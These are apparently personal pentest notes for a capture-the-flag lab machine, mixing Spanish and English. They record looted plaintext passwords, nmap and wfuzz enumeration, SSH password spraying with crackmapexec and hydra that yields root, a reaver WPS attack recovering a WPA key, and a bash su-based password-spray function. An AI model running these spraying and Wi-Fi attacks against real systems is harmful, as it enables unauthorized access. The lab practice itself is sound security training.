<font color="green">=======================================================================</font>
# Initial Information<font color="red">:</font> 
<font color="blue">=======================================================================</font>

Name | IP Address | Tech Stack | Web Server | DB
-- | -- | -- | -- | --
-- | -- | -- | -- | --


<hr>

### Loot - Credentials<font color="red">:</font> 

| **User**                                                                                                                                         | **Password**                                                                                             | **System** |
| ------------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------- | ---------- |
| samantha<br>root<br>daemon<br>oliver<br>netadmin<br><br>root<br>daemon<br>ftp<br>network<br>nobody<br>ntp<br>dnsmasq<br>logd<br>ubus<br>netadmin | VeRyUniUqWiFIPasswrd1!<br>WhatIsRealAnDWhAtIsNot51121!<br><br><br>found them on: cat etc/config/wireless |            |
|                                                                                                                                                  |                                                                                                          |            |

<hr>

<font color="green">=======================================================================</font>
# Enumeration
<font color="green">=======================================================================</font>

##### <font color="red">[+]</font> SERVICES<font color="red">:</font> 
- HTTP - <font color="red">XX</font> 

##### <font color="red">[+]</font> NMAP<font color="red">:</font> 

List all ports.
```bash
sudo nmap $IP -p- -sS --min-rate 5000 -Pn -n -v

PORT   STATE SERVICE
```

Services and version on identified open ports.
```bash 
nmap $IP -p XXX -sCV -oN enum/nmap -v

PORT   STATE SERVICE VERSION
```


<hr>

##### <font color="red">[+]</font> WFUZZ

###### FILES: <font color="red">/</font>(Web Root)
```bash
wfuzz -c --hc 404 --hh 0 -u http://$IP/FUZZ  -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 200

# Results:
=====================================================================
ID           Response   Lines    Word       Chars       Payload               
=====================================================================
```

###### DIRECTORIES: <font color="red">/</font>(Web Root)
```bash
wfuzz -c --hc 404 --hh 0 -u http://$IP/FUZZ/  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 200

Results:
=====================================================================
ID           Response   Lines    Word       Chars       Payload               
=====================================================================
```

<hr>

<font color="green">=======================================================================</font>
# Post Exploitation
<font color="green">=======================================================================</font>

##### <font color="red">[+]</font> PrivEsc Notes<font color="red">:</font> 


##### <font color="red">[+]</font> System Enumeration<font color="red">:</font> 

- **Host**:
- **Compilation version and architecture**:


##### <font color="red">[+]</font> List Interesting Directories<font color="red">:</font> 

- **/tmp**:
- **/opt**:
- **/var/tmp**:
- **/dev/shm**:
- **/var/backups/**:
- **/var/mail**:

##### <font color="red">[+]</font> S/GUIDS<font color="red">:</font> 

- SUIDs:
```bash
getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/reaver = cap_net_raw+ep
```

##### <font color="red">[+]</font> ROOT Processes (ps) <font color="red">:</font> 
```bash
ps aux | grep -i root --color
```

##### <font color="red">[+]</font> Local Network Services (netstat/ss)<font color="red">:</font> 
```bash
# (or ss if netstat not available)
netstat -tunlp | grep '127.0.0.1' --color=auto
netstat -antup | grep '127.0.0.1' --color=auto
```

##### <font color="red">[+]</font> I/O - PsPy<font color="red">:</font> 
```bash
```


##### <font color="red">[+]</font> Explotation<font color="red">:</font> 

Se puede instalar 
sudo pip3 install crackmapexec
o tambien usar hydra:

Es mejor hydra, no hay que instalarlo y aparte me encontro los dos, mientras que crackmapexec solo me encontro root y termino ahi el proceso. creo que en cuanto encuentra uno termina automaticamente. 

```bash
crackmapexec ssh $ip -u users -p passwords

SSH         10.10.11.247    22     10.10.11.247     [+] root:WhatIsRealAnDWhAtIsNot51121! (Pwn3d!)
```

```bash
hydra -L users -P passwords ssh://$ip
[22][ssh] host: 10.10.11.247   login: netadmin   password: VeRyUniUqWiFIPasswrd1!
[22][ssh] host: 10.10.11.247   login: root   password: WhatIsRealAnDWhAtIsNot51121!
```


##### <font color="red">[+]</font> Explotation from inside<font color="red">:</font> 

We look for the wifinetwoks:
we can also try
```bash
iwconfig
ifconfig

```

```
iwlist scan
wlan1     Scan completed :
          Cell 01 - Address: 02:00:00:00:00:00
```

```bash
reaver -i mon0 -b 02:00:00:00:00:00

[+] Waiting for beacon from 02:00:00:00:00:00
[+] Received beacon from 02:00:00:00:00:00
[!] Found packet with bad FCS, skipping...
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
[+] WPS PIN: '12345670'
[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
[+] AP SSID: 'OpenWrt'

```

ippsec hace un do_spray que lo hice un script y lo copio en la terminal para declarar la funcion:
```bash
do_spray() {
    users=$(awk -F: '{ if ($NF ~ /sh$/) print $1 }' /etc/passwd)
    for user in $users; do
        echo "$1" | timeout 2 su $user -c whoami 2>/dev/null
        if [ $? -eq 0 ]; then
            return
        fi
    done
}

```
luego simplemente llamo la funcion y ejecuto:
```bash
do_spray "WhatIsRealAnDWhAtIsNot51121!"
root
```
y me dice que root tiene esa contrasena. 
lo pondre en un binario llamado spray que lo copia en el portapapeles.

https://youtu.be/jj4r5lwnCp8?si=hMFgN5dtUfCfWPZm
